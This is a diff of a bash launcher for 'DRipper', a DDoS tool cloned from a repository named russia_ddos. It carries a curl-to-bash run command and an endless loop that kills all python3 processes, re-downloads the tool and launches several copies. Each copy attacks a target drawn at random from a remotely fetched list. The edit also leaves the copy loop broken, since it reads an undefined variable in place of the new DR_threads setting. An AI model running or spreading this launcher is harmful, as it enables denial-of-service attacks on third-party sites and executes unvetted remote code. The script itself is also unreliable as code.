@@ -1,15 +1,23 @@
-##### use next command in local linux terminal to run this script #####
+##### Use next command in local linux terminal to run this script #####
 #curl https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_init | cat | bash
+
+##### To kill script CTRL+C will not be sufficient
+##### Run 'pkill -9 python3' in other terminal and then press CTRL+C in terminal where DRipper was launched
 
 #!/bin/bash
 while true
 do
+        ## Download newest version of DRipper
         pkill -9 python3
         cd ~
         rm -rf russia_ddos
         git clone https://github.com/alexmon1989/russia_ddos.git
         pip install -r russia_ddos/requirements.txt
-        for i in $(seq 1 8)
+        
+        ## Launch several copies of DRipper. All output will run in single terminal so will be slightly messy.
+        ## But it is more efficient and easy to manage.
+        DR_threads=6
+        for i in $(seq 1 $number_of_threads)
         do
              site=$(curl https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper | cat | shuf -n 1)
              addr=$(echo $site | awk '{print $1}')
